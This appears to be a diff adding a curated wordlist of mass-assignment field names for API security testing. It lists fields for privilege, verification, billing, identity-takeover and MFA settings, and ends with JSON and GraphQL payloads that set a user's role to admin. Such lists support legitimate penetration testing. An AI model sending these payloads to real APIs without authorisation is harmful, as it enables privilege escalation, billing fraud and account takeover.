@@ -1,0 +1,112 @@
+# REST/JSON mass assignment field seeds — API3:2023 / BOLA adjacent
+# Source: OWASP API Security, Rails strong params bypass, Spring @RequestBody, Node body-parser
+# Tier: Curated | PUT/PATCH/POST profile, signup, checkout, admin proxies
+
+# --- Role / privilege ---
+role
+roles
+user_role
+userRole
+group
+groups
+permission
+permissions
+scope
+scopes
+isAdmin
+is_admin
+admin
+isSuperuser
+is_superuser
+superuser
+staff
+isStaff
+is_staff
+isModerator
+is_moderator
+privilege
+privileges
+access_level
+accessLevel
+userType
+user_type
+accountType
+account_type
+type
+
+# --- Verification / account state ---
+verified
+email_verified
+emailVerified
+phone_verified
+phoneVerified
+isVerified
+is_verified
+active
+enabled
+approved
+status
+state
+banned
+suspended
+locked
+
+# --- Billing / plan ---
+plan
+plan_id
+planId
+subscription
+subscription_tier
+subscriptionTier
+tier
+price
+amount
+balance
+credits
+wallet
+discount
+coupon
+promo
+trial
+trial_end
+trialEnd
+
+# --- Identity takeover ---
+email
+password
+password_hash
+passwordHash
+username
+user_id
+userId
+owner_id
+ownerId
+organization_id
+organizationId
+tenant_id
+tenantId
+
+# --- Security controls ---
+mfa_enabled
+mfaEnabled
+two_factor
+twoFactor
+otp_required
+otpRequired
+require_password_change
+requirePasswordChange
+api_key
+apiKey
+secret
+token
+refresh_token
+refreshToken
+
+# --- Nested object injection (JSON body) ---
+{"user":{"role":"admin"}}
+{"profile":{"is_admin":true}}
+{"data":{"attributes":{"role":"admin"}}}
+{"_embedded":{"role":"admin"}}
+
+# --- GraphQL-style over REST (some APIs accept) ---
+{"query":"mutation{updateUser(role:admin){id}}"}
